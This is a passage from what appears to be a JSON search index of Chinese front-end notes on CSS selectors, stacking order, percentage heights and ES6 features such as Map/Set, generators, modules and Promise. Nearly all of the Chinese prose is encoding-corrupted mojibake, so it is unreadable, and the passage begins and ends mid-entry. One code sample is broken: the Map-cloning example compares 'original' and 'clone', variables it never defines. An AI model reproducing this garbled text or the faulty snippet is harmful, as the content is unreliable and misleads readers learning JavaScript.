2\"> æ‰€å¤„çš„çˆ¶å±‚å ä¸Šä¸‹æ–‡ä¹Ÿæ˜¯ div1 äº§ç”Ÿçš„å±‚å ä¸Šä¸‹æ–‡ </div> </div> </div> å…¶ä»– è®°å½•ä¸€ä¸ªç°è±¡, cssç”Ÿæ•ˆä¸å®Œå…¨æ˜¯æŒ‰ç…§å®šä¹‰çš„é¡ºåºæ¥çš„, å°¤å…¶å½“æ ·å¼å®šä¹‰ä¸å¤šä¸ªæ–‡ä»¶, æµè§ˆå™¨å¯èƒ½ç”±äºç½‘ç»œåŸå› ã€åŠ è½½æœºåˆ¶ç­‰, æ•ˆæœä¸å¯¼å…¥é¡ºåºä¸ä¸€è‡´; ä¸”å®é™…åœ¨å¼€å‘theiaé¡¹ç›®ä¸­, å‘ç°, é™åˆ¶æ¡ä»¶æ›´æ˜ç¡®çš„, å¯èƒ½ä¼˜å…ˆçº§æ›´é«˜, æ¯”å¦‚ .cl1:hover çš„ä¼˜å…ˆçº§ä½äº .cl1:hover:not(:disabled):not(is-disabled) æš‚æ—¶è¿˜æ²¡æ‰¾åˆ°åŸå› ","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-The-order-of-elements.html","loc":"/yq-doc-source-docs-front-end-CSS-The-order-of-elements.html"},{"title":"å‰ç«¯å„ç§é€‰æ‹©å™¨","text":"ä¸»è¦æ˜¯ä¸‰å¤§ç±»: IDé€‰æ‹©å™¨(#) ç±»é€‰æ‹©å™¨(.) HTMLæ ‡ç­¾é€‰æ‹©å™¨ åœ¨CSSä¸­å®šä¹‰æ ·å¼æ—¶å€™, æœ‰å‡ ç§æƒ…å†µ: å¤åˆé€‰æ‹©å™¨: æ— åˆ†éš”ç¬¦, è¡¨ç¤ºåº”ç”¨ä¸åŒæ—¶å…·æœ‰è¿™äº›åç§°çš„é€‰æ‹©å™¨; å¦‚: .cl1.cl2 è¡¨ç¤ºé€‰æ‹©åŒæ—¶å…·æœ‰è¿™ä¸¤ä¸ªç±»çš„å…ƒç´ ; é€‰æ‹©å™¨åˆ—è¡¨: å¤šä¸ªé€‰æ‹©å™¨ä»¥é€—å·(,)åˆ†å‰², è¡¨ç¤ºæ ·å¼åŒæ—¶åº”ç”¨ä¸è¿™äº›é€‰æ‹©å™¨; å¦‚: .cl1, .cl2 ; åä»£ç»„åˆå™¨: å¤šä¸ªé€‰æ‹©å™¨ä»¥ç©ºæ ¼( )åˆ†å‰², è¡¨ç¤ºæ ·å¼åº”ç”¨ä¸ æŒ‰ç…§é¡ºåºé€‰æ‹©æ»¡è¶³æ¡ä»¶çš„æ‰€æœ‰åä»£(åä»£é€‰æ‹©å™¨); å¦‚: .cl1 .cl2 ; ç›´æ¥å­ä»£ç»„åˆå™¨: å¤šä¸ªé€‰æ‹©å™¨ä»¥å³ç®­å¤´(>)åˆ†å‰², è¡¨ç¤ºæ ·å¼åº”ç”¨ä¸ æŒ‰ç…§é¡ºåºé€‰æ‹©æ»¡è¶³æ¡ä»¶çš„ç›´å±å­å…ƒç´ (å­å…ƒç´ é€‰æ‹©å™¨); å¦‚: .cl1 > .cl2 ; ç´§é‚»å…„å¼Ÿç»„åˆå™¨: å¤šä¸ªé€‰æ‹©å™¨ä»¥åŠ å·(+)åˆ†å‰², è¡¨ç¤ºæ ·å¼åº”ç”¨ä¸ é€‰æ‹©ç´§æ¥åœ¨å¦ä¸€ä¸ªå…ƒç´ åçš„å…ƒç´ (ç›¸é‚»å…„å¼Ÿé€‰æ‹©å™¨); å¦‚: .cl1 + .cl2 ; ä¸€èˆ¬å…„å¼Ÿç»„åˆå™¨: å¤šä¸ªé€‰æ‹©å™¨ä»¥æ³¢æµª(~)åˆ†å‰², è¡¨ç¤ºæ ·å¼åº”ç”¨ä¸ é€‰æ‹©åœ¨ä¸€ä¸ªå…ƒç´ åé¢çš„æ‰€æœ‰å…„å¼Ÿå…ƒç´ (é€šç”¨å…„å¼Ÿé€‰æ‹©å™¨); å¦‚: .cl1 ~ .cl2 ; å…¶ä»–, è§: https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors ä¼ªç±»/å…ƒç´ é€‰æ‹©å™¨ ä¼ªç±»é€‰æ‹©å™¨ä»¥ä¸€ä¸ªå†’å·ï¼ˆ:ï¼‰å¼€å¤´ ä¼ªå…ƒç´ é€‰æ‹©å™¨ä»¥ä¸¤ä¸ªå†’å·ï¼ˆ::ï¼‰å¼€å¤´ æ ¹æ®è§„èŒƒï¼Œä¼ªç±»é€‰æ‹©å™¨æ”¯æŒå•å†’å·å’ŒåŒå†’å·çš„å†™æ³•ï¼Œ ä½†åœ¨å®é™…ä½¿ç”¨ä¸­ï¼ŒåŒå†’å·é€šå¸¸ç”¨äºä¼ªå…ƒç´ é€‰æ‹©å™¨ï¼Œä»¥åŒºåˆ†ä¼ªå…ƒç´ å’Œä¼ªç±»ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-Various-selectors.html","loc":"/yq-doc-source-docs-front-end-CSS-Various-selectors.html"},{"title":"å®½åº¦-é«˜åº¦ç™¾åˆ†æ¯”è¯´æ˜","text":"å…³äºheightè¿™ç§è®¾ç½®çš„å±æ€§ä¸ºç™¾åˆ†æ¯”è®¡ç®— ä¸€èˆ¬æƒ…å†µä¸‹, ä¸ä¸ºç»å¯¹å®šä½æ—¶å€™æ˜¯ä½¿ç”¨çˆ¶å…ƒç´ çš„å®½é«˜è®¡ç®—çš„. æ›´ç¡®åˆ‡åœ°è¯´æ˜¯ åŒ…å«å— : çˆ¶å…ƒç´ çš„å†…å®¹åŒºï¼ˆç›’æ¨¡å‹é‡Œçš„contentï¼‰ å®é™…ç”Ÿæ•ˆçš„å…·ä½“å€¼çš„è®¡ç®—æ–¹å¼ä¸º: å…ƒç´ çš„åŒ…å«å—å¤§å° * è®¾å®šçš„ç™¾åˆ†æ¯” æ³¨è§£ ä¸€èˆ¬æƒ…å†µä¸‹, ä¸æ˜¯ç»å¯¹å®šä½å…ƒç´ ( position: absolute | fixed)ã€æ ¹å…ƒç´  html ä»¥åŠæ ¹å­—ä½“, å…ƒç´ çš„åŒ…å«å—å°±æ˜¯çˆ¶å…ƒç´  ä»€ä¹ˆæ˜¯å…ƒç´ çš„åŒ…å«å—? å…ƒç´ çš„åŒ…å«å—æ˜¯æŒ‡å…ƒç´ ç”¨æ¥è®¡ç®—å’Œå®šä½çš„ä¸€ä¸ªæ¡†; å¯¹äºå¼€å¯ç»å¯¹å®šä½çš„å…ƒç´ æ¥è¯´ï¼Œå…¶åŒ…å«å—æ˜¯ç¦»å®ƒæœ€è¿‘çš„å¼€å¯äº†å®šä½ï¼ˆä¸”positionä¸ä¸ºstaticï¼‰çš„ç¥–å…ˆå…ƒç´ ; å¦‚æœæ‰€æœ‰çš„ç¥–å…ˆå…ƒç´ éƒ½æ²¡æœ‰å¼€å¯å®šä½ï¼Œåˆ™å…¶åŒ…å«å—å°±æ˜¯åˆå§‹åŒ…å«å—; ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ ¹å…ƒç´ ï¼ˆåœ¨å¾ˆå¤šåœºæ™¯ä¸‹å¯ä»¥çœ‹æˆ<html>ï¼‰è¢«ç§°ä¸ºåˆå§‹åŒ…å«å—ï¼Œå…¶å°ºå¯¸ç­‰åŒäºæµè§ˆå™¨å¯è§†çª—å£çš„å¤§å°; å¯¹äºå…¶ä»–å…ƒç´ ï¼Œå¦‚æœè¯¥å…ƒç´ çš„positionæ˜¯relativeæˆ–è€…staticï¼Œåˆ™åŒ…å«å—ç”±å…¶æœ€è¿‘çš„å—çº§ç¥–å…ˆå…ƒç´ content boxè¾¹ç•Œå½¢æˆ; å¦‚æœå…ƒç´ çš„positionä¸ºfixedï¼Œåˆ™åŒ…å«å—æ˜¯åˆå§‹åŒ…å«å—; å¦‚æœå…ƒç´ positionä¸ºabsoluteï¼Œåˆ™åŒ…å«å—ç”±æœ€è¿‘çš„positionä¸ä¸ºstaticçš„ç¥–å…ˆå…ƒç´ å»ºç«‹; æœ‰æ—¶å€™ä¼šå‘ç°è®¾ç½®çš„é«˜åº¦æ²¡æœ‰ç”Ÿæ•ˆ åŸå› æ˜¯: å½“ä¸€ä¸ªå…ƒç´ çš„é«˜åº¦ä½¿ç”¨ç™¾åˆ†æ¯”å€¼ï¼Œ å¦‚æœå…¶åŒ…å«å—æ²¡æœ‰æ˜ç¡®çš„é«˜åº¦å®šä¹‰ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œå–å†³äºå†…å®¹é«˜åº¦ï¼‰ï¼Œ ä¸”è¿™ä¸ªå…ƒç´ ä¸æ˜¯ç»å¯¹å®šä½ï¼Œåˆ™è¯¥ç™¾åˆ†æ¯”å€¼ç­‰åŒäºautoã€‚autoæ˜¯åˆå§‹é»˜è®¤å€¼ï¼Œæ‰€ä»¥çœ‹èµ·æ¥å°±åƒæ˜¯\"å¤±æ•ˆ\"äº†ã€‚ æ­¤éƒ¨åˆ†å‚è€ƒ: https://zhuanlan.zhihu.com/p/394791528 ç¤ºä¾‹","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-Width-height-percentage-explanation.html","loc":"/yq-doc-source-docs-front-end-CSS-Width-height-percentage-explanation.html"},{"title":"csså¸¸è§ä½¿ç”¨æŠ€å·§","text":"å…ƒç´ ä»å·¦åˆ°å³æ’åˆ— è¿™äº›ä»å·¦åˆ°å³çš„å…ƒç´ è®¾ç½® display ä¸º flex å³å¯: .container { display: flex; } åœ¨è¿™ä¸ªåŸºç¡€ä¸Š, å¦‚æœè¦å†å®ç°æœ€åä¸€ä¸ªå…ƒç´ é å³, é‚£ä¹ˆå¯ä»¥: .item-right { /* ä¼šç§»åŠ¨åˆ°æœ€å³è¾¹ */ margin-left: auto; } divç»“æ„: <div class=\"container\"> xxx1 <div class=\"item\">xxx2</div> <div class=\"item-right\">xxx3</div> </div> æ•ˆæœ","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-CSS-common-use-of-CSS.html","loc":"/yq-doc-source-docs-front-end-CSS-common-use-of-CSS.html"},{"title":"ES6 æ•°ç»„","text":"æ•°ç»„åˆ›å»º ç±»æ•°ç»„å¯¹è±¡ ä¸€ä¸ªç±»æ•°ç»„å¯¹è±¡å¿…é¡»å«æœ‰ length å±æ€§ï¼Œä¸”å…ƒç´ å±æ€§åå¿…é¡»æ˜¯æ•°å€¼æˆ–è€…å¯è½¬æ¢ä¸ºæ•°å€¼çš„å­—ç¬¦ è½¬æ¢å¯è¿­ä»£å¯¹è±¡ è½¬æ¢ map: let map = new Map(); map.set('key0', 'value0'); map.set('key1', 'value1'); console.log(Array.from(map)); // [['key0', 'value0'],['key1', // 'value1']] è½¬æ¢ set: let arr = [1, 2, 3]; let set = new Set(arr); console.log(Array.from(set)); // [1, 2, 3] è½¬æ¢å­—ç¬¦ä¸²: let str = 'abc'; console.log(Array.from(str)); // [\"a\", \"b\", \"c\"] æ‰©å±•çš„æ–¹æ³• æŸ¥æ‰¾ å¡«å…… éå† åŒ…å« åµŒå¥—æ•°ç»„è½¬ä¸€ç»´æ•°ç»„","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-Array.html","loc":"/yq-doc-source-docs-front-end-ES6-Array.html"},{"title":"async å‡½æ•°","text":"async async æ˜¯ ES7 æ‰æœ‰çš„ä¸å¼‚æ­¥æ“ä½œæœ‰å…³çš„å…³é”®å­—ï¼Œå’Œ Promise ï¼Œ Generator æœ‰å¾ˆå¤§å…³è”çš„ã€‚ è¯­æ³• è¿”å›å€¼ async å‡½æ•°è¿”å›ä¸€ä¸ª Promise å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨ then æ–¹æ³•æ·»åŠ å›è°ƒå‡½æ•° await await æ“ä½œç¬¦ç”¨äºç­‰å¾…ä¸€ä¸ª Promise å¯¹è±¡, å®ƒåªèƒ½åœ¨å¼‚æ­¥å‡½æ•° async function å†…éƒ¨ä½¿ç”¨ã€‚ è¿”å›å€¼ è¿”å› Promise å¯¹è±¡çš„å¤„ç†ç»“æœã€‚å¦‚æœç­‰å¾…çš„ä¸æ˜¯ Promise å¯¹è±¡ï¼Œåˆ™è¿”å›è¯¥å€¼æœ¬èº«ã€‚ awaité’ˆå¯¹æ‰€è·Ÿä¸åŒè¡¨è¾¾å¼çš„å¤„ç†æ–¹å¼ï¼š Promise å¯¹è±¡ï¼šawait ä¼šæš‚åœæ‰§è¡Œï¼Œç­‰å¾… Promise å¯¹è±¡ resolveï¼Œç„¶åæ¢å¤ async å‡½æ•°çš„æ‰§è¡Œå¹¶è¿”å›è§£æå€¼ã€‚ é Promise å¯¹è±¡ï¼šç›´æ¥è¿”å›å¯¹åº”çš„å€¼ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-Async-function.html","loc":"/yq-doc-source-docs-front-end-ES6-Async-function.html"},{"title":"åŸºæœ¬æ•°æ®ç±»å‹","text":"æ”¯æŒçš„æ•°æ®ç±»å‹: Number String Boolean Object null undefined Symbol (ES6æ–°å¢); æ¯ä¸€ä¸ª Symbol çš„å€¼éƒ½æ˜¯ä¸ç›¸ç­‰çš„ æœ‰ Symbol.for() çš„ç±»ä¼¼å•ä¾‹åŠŸèƒ½: let yellow = Symbol(\"Yellow\"); let yellow1 = Symbol.for(\"Yellow\"); yellow === yellow1; // false let yellow2 = Symbol.for(\"Yellow\"); yellow1 === yellow2; // true å’Œ Symbol.keyFor() æ£€æŸ¥æ˜¯å¦å·²ç™»è®°: let yellow1 = Symbol.for(\"Yellow\"); Symbol.keyFor(yellow1); // \"Yellow\"","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-Basic-data-type.html","loc":"/yq-doc-source-docs-front-end-ES6-Basic-data-type.html"},{"title":"ES6 Generator å‡½æ•°","text":"ES6 æ–°å¼•å…¥äº† Generator å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡ yield å…³é”®å­—ï¼ŒæŠŠå‡½æ•°çš„æ‰§è¡ŒæµæŒ‚èµ·ï¼Œ ä¸ºæ”¹å˜æ‰§è¡Œæµç¨‹æä¾›äº†å¯èƒ½ï¼Œä»è€Œä¸ºå¼‚æ­¥ç¼–ç¨‹æä¾›è§£å†³æ–¹æ¡ˆ Generator å‡½æ•°ç»„æˆ Generator æœ‰ä¸¤ä¸ªåŒºåˆ†äºæ™®é€šå‡½æ•°çš„éƒ¨åˆ†: ä¸€æ˜¯åœ¨ function åé¢ï¼Œå‡½æ•°åä¹‹å‰æœ‰ä¸ª * å‡½æ•°å†…éƒ¨æœ‰ yield è¡¨è¾¾å¼ å…¶ä¸­ * ç”¨æ¥è¡¨ç¤ºå‡½æ•°ä¸º Generator å‡½æ•°ï¼Œyield ç”¨æ¥å®šä¹‰å‡½æ•°å†…éƒ¨çš„çŠ¶æ€: function* func(){ console.log(\"one\"); yield '1'; console.log(\"two\"); yield '2'; console.log(\"three\"); return '3'; } æ‰§è¡Œæœºåˆ¶ è°ƒç”¨ Generator å‡½æ•°å’Œè°ƒç”¨æ™®é€šå‡½æ•°ä¸€æ ·ï¼Œåœ¨å‡½æ•°ååé¢åŠ ä¸Š()å³å¯ï¼Œ ä½†æ˜¯ Generator å‡½æ•°ä¸ä¼šåƒæ™®é€šå‡½æ•°ä¸€æ ·ç«‹å³æ‰§è¡Œï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªæŒ‡å‘å†…éƒ¨çŠ¶æ€å¯¹è±¡çš„æŒ‡é’ˆï¼Œ æ‰€ä»¥è¦è°ƒç”¨éå†å™¨å¯¹è±¡Iterator çš„ next æ–¹æ³•ï¼ŒæŒ‡é’ˆå°±ä¼šä»å‡½æ•°å¤´éƒ¨æˆ–è€…ä¸Šä¸€æ¬¡åœä¸‹æ¥çš„åœ°æ–¹å¼€å§‹æ‰§è¡Œ å‡½æ•°è¿”å›çš„éå†å™¨å¯¹è±¡çš„æ–¹æ³• next æ–¹æ³• ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œnext æ–¹æ³•ä¸ä¼ å…¥å‚æ•°çš„æ—¶å€™ï¼Œyield è¡¨è¾¾å¼çš„è¿”å›å€¼æ˜¯ undefined . å½“ next ä¼ å…¥å‚æ•°çš„æ—¶å€™ï¼Œè¯¥å‚æ•°ä¼šä½œä¸ºä¸Šä¸€æ­¥yieldçš„è¿”å›å€¼ã€‚ yield* è¡¨è¾¾å¼ yield* è¡¨è¾¾å¼è¡¨ç¤º yield è¿”å›ä¸€ä¸ªéå†å™¨å¯¹è±¡ï¼Œç”¨äºåœ¨ Generator å‡½æ•°å†…éƒ¨ï¼Œè°ƒç”¨å¦ä¸€ä¸ª Generator å‡½æ•°ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-Generator-function.html","loc":"/yq-doc-source-docs-front-end-ES6-Generator-function.html"},{"title":"Mapä¸Set","text":"Map å¯¹è±¡ Map å¯¹è±¡ä¿å­˜é”®å€¼å¯¹ã€‚ä»»ä½•å€¼(å¯¹è±¡æˆ–è€…åŸå§‹å€¼) éƒ½å¯ä»¥ä½œä¸ºä¸€ä¸ªé”®æˆ–ä¸€ä¸ªå€¼ Maps å’Œ Objects çš„åŒºåˆ« ä¸€ä¸ª Object çš„é”®åªèƒ½æ˜¯å­—ç¬¦ä¸²æˆ–è€… Symbolsï¼Œä½†ä¸€ä¸ª Map çš„é”®å¯ä»¥æ˜¯ä»»æ„å€¼ Map ä¸­çš„é”®å€¼æ˜¯æœ‰åºçš„ï¼ˆFIFO åŸåˆ™ï¼‰ï¼Œè€Œæ·»åŠ åˆ°å¯¹è±¡ä¸­çš„é”®åˆ™ä¸æ˜¯ Map çš„é”®å€¼å¯¹ä¸ªæ•°å¯ä»¥ä» size å±æ€§è·å–ï¼Œè€Œ Object çš„é”®å€¼å¯¹ä¸ªæ•°åªèƒ½æ‰‹åŠ¨è®¡ç®— Object éƒ½æœ‰è‡ªå·±çš„åŸå‹ï¼ŒåŸå‹é“¾ä¸Šçš„é”®åæœ‰å¯èƒ½å’Œä½ è‡ªå·±åœ¨å¯¹è±¡ä¸Šçš„è®¾ç½®çš„é”®åäº§ç”Ÿå†²çª Mapçš„è¿­ä»£ æ–¹æ³•ä¸€, ä½¿ç”¨ for ... of ... : var myMap = new Map(); myMap.set(0, \"zero\"); myMap.set(1, \"one\"); // å°†ä¼šæ˜¾ç¤ºä¸¤ä¸ª logã€‚ ä¸€ä¸ªæ˜¯ \"0 = zero\" å¦ä¸€ä¸ªæ˜¯ \"1 = one\" for (var [key, value] of myMap) { console.log(key + \" = \" + value); } for (var [key, value] of myMap.entries()) { console.log(key + \" = \" + value); } /* è¿™ä¸ª entries æ–¹æ³•è¿”å›ä¸€ä¸ªæ–°çš„ Iterator å¯¹è±¡ï¼Œå®ƒæŒ‰æ’å…¥é¡ºåºåŒ…å«äº† Map å¯¹è±¡ä¸­æ¯ä¸ªå…ƒç´ çš„ [key, value] æ•°ç»„ã€‚ */ æ–¹æ³•äºŒ, ä½¿ç”¨ forEach() : var myMap = new Map(); myMap.set(0, \"zero\"); myMap.set(1, \"one\"); // å°†ä¼šæ˜¾ç¤ºä¸¤ä¸ª logsã€‚ ä¸€ä¸ªæ˜¯ \"0 = zero\" å¦ä¸€ä¸ªæ˜¯ \"1 = one\" myMap.forEach(function(value, key) { console.log(key + \" = \" + value); }, myMap) Map å¯¹è±¡çš„æ“ä½œ Map ä¸ Arrayçš„è½¬æ¢ Map æ„é€ å‡½æ•°å¯ä»¥å°†ä¸€ä¸ªäºŒç»´é”®å€¼å¯¹æ•°ç»„è½¬æ¢æˆä¸€ä¸ª Map å¯¹è±¡: var kvArray = [[\"key1\", \"value1\"], [\"key2\", \"value2\"]]; var myMap = new Map(kvArray); ä½¿ç”¨ Array.from å‡½æ•°å¯ä»¥å°†ä¸€ä¸ª Map å¯¹è±¡è½¬æ¢æˆä¸€ä¸ªäºŒç»´é”®å€¼å¯¹æ•°ç»„: var outArray = Array.from(myMap); Map çš„å…‹éš† var myMap1 = new Map([[\"key1\", \"value1\"], [\"key2\", \"value2\"]]); var myMap2 = new Map(myMap1); console.log(original === clone); // æ‰“å° falseã€‚ Map å¯¹è±¡æ„é€ å‡½æ•°ç”Ÿæˆå®ä¾‹ï¼Œè¿­ä»£å‡ºæ–°çš„å¯¹è±¡ã€‚ Map çš„åˆå¹¶ åˆå¹¶ä¸¤ä¸ª Map å¯¹è±¡æ—¶ï¼Œå¦‚æœæœ‰é‡å¤çš„é”®å€¼ï¼Œåˆ™åé¢çš„ä¼šè¦†ç›–å‰é¢çš„ï¼Œå¯¹åº”å€¼å³ unoï¼Œdosï¼Œ three: var first = new Map([[1, 'one'], [2, 'two'], [3, 'three'],]); var second = new Map([[1, 'uno'], [2, 'dos']]); var merged = new Map([...first, ...second]); Set å¯¹è±¡ Set å¯¹è±¡å…è®¸ä½ å­˜å‚¨ä»»ä½•ç±»å‹çš„å”¯ä¸€å€¼ï¼Œæ— è®ºæ˜¯åŸå§‹å€¼æˆ–è€…æ˜¯å¯¹è±¡å¼•ç”¨ Set ä¸­çš„ç‰¹æ®Šå€¼ Set å¯¹è±¡å­˜å‚¨çš„å€¼æ€»æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥éœ€è¦åˆ¤æ–­ä¸¤ä¸ªå€¼æ˜¯å¦æ’ç­‰ æœ‰å‡ ä¸ªç‰¹æ®Šå€¼éœ€è¦ç‰¹æ®Šå¯¹å¾…ï¼š +0 ä¸ -0 åœ¨å­˜å‚¨åˆ¤æ–­å”¯ä¸€æ€§çš„æ—¶å€™æ˜¯æ’ç­‰çš„ï¼Œæ‰€ä»¥ä¸é‡å¤ï¼› undefined ä¸ undefined æ˜¯æ’ç­‰çš„ï¼Œæ‰€ä»¥ä¸é‡å¤ï¼› NaN ä¸ NaN æ˜¯ä¸æ’ç­‰çš„ï¼Œä½†æ˜¯åœ¨ Set ä¸­åªèƒ½å­˜ä¸€ä¸ªï¼Œä¸é‡å¤ã€‚ ç±»å‹è½¬æ¢ Array Array è½¬ Set: var mySet = new Set([\"value1\", \"value2\", \"value3\"]); ç”¨...æ“ä½œç¬¦ï¼Œå°† Set è½¬ Array: var myArray = [...mySet]; String String è½¬ Set: var mySet = new Set('hello'); // Set(4) {\"h\", \"e\", \"l\", \"o\"} // æ³¨ï¼šSet ä¸­ toString æ–¹æ³•æ˜¯ä¸èƒ½å°† Set è½¬æ¢æˆ String å¹¶é›†: var a = new Set([1, 2, 3]); var b = new Set([4, 3, 2]); var union = new Set([...a, ...b]); // {1, 2, 3, 4} äº¤é›†: var a = new Set([1, 2, 3]); var b = new Set([4, 3, 2]); var intersect = new Set([...a].filter(x => b.has(x))); // {2, 3} å·®é›†: var a = new Set([1, 2, 3]); var b = new Set([4, 3, 2]); var difference = new Set([...a].filter(x => !b.has(x))); // {1}","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-MAP-and-SET.html","loc":"/yq-doc-source-docs-front-end-ES6-MAP-and-SET.html"},{"title":"ES6 æ¨¡å—","text":"ES6 å¼•å…¥äº†æ¨¡å—åŒ–ï¼Œå…¶è®¾è®¡æ€æƒ³æ˜¯åœ¨ç¼–è¯‘æ—¶å°±èƒ½ç¡®å®šæ¨¡å—çš„ä¾èµ–å…³ç³»ï¼Œä»¥åŠè¾“å…¥å’Œè¾“å‡ºçš„å˜é‡ã€‚ ES6 çš„æ¨¡å—åŒ–åˆ†ä¸ºå¯¼å‡ºï¼ˆexportï¼‰ @ä¸å¯¼å…¥ï¼ˆimportï¼‰ä¸¤ä¸ªæ¨¡å—ã€‚ ES6 çš„æ¨¡å—è‡ªåŠ¨å¼€å¯ä¸¥æ ¼æ¨¡å¼ï¼Œä¸ç®¡ä½ æœ‰æ²¡æœ‰åœ¨æ¨¡å—å¤´éƒ¨åŠ ä¸Š use strict;ã€‚ æ¨¡å—ä¸­å¯ä»¥å¯¼å…¥å’Œå¯¼å‡ºå„ç§ç±»å‹çš„å˜é‡ï¼Œå¦‚å‡½æ•°ï¼Œå¯¹è±¡ï¼Œå­—ç¬¦ä¸²ï¼Œæ•°å­—ï¼Œå¸ƒå°”å€¼ï¼Œç±»ç­‰ã€‚ æ¯ä¸ªæ¨¡å—éƒ½æœ‰è‡ªå·±çš„ä¸Šä¸‹æ–‡ï¼Œæ¯ä¸€ä¸ªæ¨¡å—å†…å£°æ˜çš„å˜é‡éƒ½æ˜¯å±€éƒ¨å˜é‡ï¼Œä¸ä¼šæ±¡æŸ“å…¨å±€ä½œç”¨åŸŸã€‚ æ¯ä¸€ä¸ªæ¨¡å—åªåŠ è½½ä¸€æ¬¡ï¼ˆæ˜¯å•ä¾‹çš„ï¼‰ï¼Œ è‹¥å†å»åŠ è½½åŒç›®å½•ä¸‹åŒæ–‡ä»¶ï¼Œç›´æ¥ä»å†…å­˜ä¸­è¯»å–ã€‚ å»ºè®®ä½¿ç”¨å¤§æ‹¬å·æŒ‡å®šæ‰€è¦è¾“å‡ºçš„ä¸€ç»„å˜é‡å†™åœ¨æ–‡æ¡£å°¾éƒ¨ï¼Œæ˜ç¡®å¯¼å‡ºçš„æ¥å£ã€‚ å‡½æ•°ä¸ç±»éƒ½éœ€è¦æœ‰å¯¹åº”çš„åç§°ï¼Œå¯¼å‡ºæ–‡æ¡£å°¾éƒ¨ä¹Ÿé¿å…äº†æ— å¯¹åº”åç§°ã€‚","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-Module.html","loc":"/yq-doc-source-docs-front-end-ES6-Module.html"},{"title":"ES6 å¯¹è±¡","text":"å¯¹è±¡å­—é¢é‡ ç®€æ´è¡¨ç¤ºæ³•: const age = 12; const name = \"Amy\"; const person = {age, name}; person //{age: 12, name: \"Amy\"} ç­‰åŒäº: const person = {age: age, name: name} å±æ€§åè¡¨è¾¾å¼ ES6å…è®¸ç”¨è¡¨è¾¾å¼ä½œä¸ºå±æ€§åï¼Œä½†æ˜¯ä¸€å®šè¦å°†è¡¨è¾¾å¼æ”¾åœ¨æ–¹æ‹¬å·å†…: const obj = { [\"he\"+\"llo\"](){ return \"Hi\"; } } obj.hello(); //\"Hi\" æ³¨è§£ å±æ€§çš„ç®€æ´è¡¨ç¤ºæ³•å’Œå±æ€§åè¡¨è¾¾å¼ä¸èƒ½åŒæ—¶ä½¿ç”¨ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚ å¯¹è±¡çš„æ‹“å±•è¿ç®—ç¬¦ æ‹“å±•è¿ç®—ç¬¦ï¼ˆ...ï¼‰ç”¨äºå–å‡ºå‚æ•°å¯¹è±¡æ‰€æœ‰å¯éå†å±æ€§ç„¶åæ‹·è´åˆ°å½“å‰å¯¹è±¡ åŸºæœ¬ç”¨æ³•: let person = {name: \"Amy\", age: 15}; let someone = { ...person }; someone; //{name: \"Amy\", age: 15} å¯ç”¨äºåˆå¹¶ä¸¤ä¸ªå¯¹è±¡: let age = {age: 15}; let name = {name: \"Amy\"}; let person = {...age, ...name}; person; //{age: 15, name: \"Amy\"} æ³¨è§£ å±æ€§ç›¸åŒæ—¶, åé¢çš„ä¼šè¦†ç›–æ‰å‰é¢çš„ å¯¹è±¡çš„æ–°æ–¹æ³•","tags":"å‰ç«¯","url":"/yq-doc-source-docs-front-end-ES6-Object.html","loc":"/yq-doc-source-docs-front-end-ES6-Object.html"},{"title":"ES6 Promise å¯¹è±¡","text":"å¼‚æ­¥ç¼–ç¨‹çš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚ ä»è¯­æ³•ä¸Šè¯´ï¼ŒPromise æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä»å®ƒå¯ä»¥è·å–å¼‚æ­¥æ“ä½œçš„æ¶ˆæ¯ Promise çŠ¶æ€ çŠ¶æ€çš„ç‰¹ç‚¹ Promise å¼‚æ­¥æ“ä½œæœ‰ä¸‰ç§çŠ¶æ€ï¼š pendingï¼ˆè¿›è¡Œä¸­ï¼‰ fulfilledï¼ˆå·²æˆåŠŸï¼‰ rejectedï¼ˆå·²å¤±è´¥ï¼‰ é™¤äº†å¼‚æ­¥æ“ä½œçš„ç»“æœï¼Œä»»ä½•å…¶ä»–æ“ä½œéƒ½æ— æ³•æ”¹å˜è¿™ä¸ªçŠ¶æ€ã€‚ Promise å¯¹è±¡åªæœ‰ï¼šä» pending å˜ä¸º fulfilled å’Œä» pending å˜ä¸º rejected çš„çŠ¶æ€æ”¹å˜ã€‚ åªè¦å¤„äº fulfilled å’Œ rejected ï¼ŒçŠ¶æ€å°±ä¸ä¼šå†å˜äº†å³ resolvedï¼ˆå·²å®šå‹ï¼‰ã€‚ çŠ¶æ€çš„ç¼ºç‚¹ æ— æ³•å–æ¶ˆ Promise ï¼Œä¸€æ—¦æ–°å»ºå®ƒå°±ä¼šç«‹å³æ‰§è¡Œï¼Œæ— æ³•ä¸­é€”å–æ¶ˆ å¦‚æœä¸è®¾ç½®å›è°ƒå‡½æ•°ï¼ŒPromise å†…éƒ¨æŠ›å‡ºçš„é”™è¯¯ï¼Œä¸ä¼šååº”åˆ°å¤–éƒ¨ å½“å¤„äº pending çŠ¶æ€æ—¶ï¼Œæ— æ³•å¾—çŸ¥ç›®å‰è¿›å±•åˆ°å“ªä¸€ä¸ªé˜¶æ®µï¼ˆåˆšåˆšå¼€å§‹è¿˜æ˜¯å³å°†å®Œæˆï¼‰ then æ–¹æ³• then æ–¹æ³•æ¥æ”¶ä¸¤ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°ï¼Œ ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ Promise æ‰§è¡ŒæˆåŠŸæ—¶çš„å›è°ƒï¼Œ 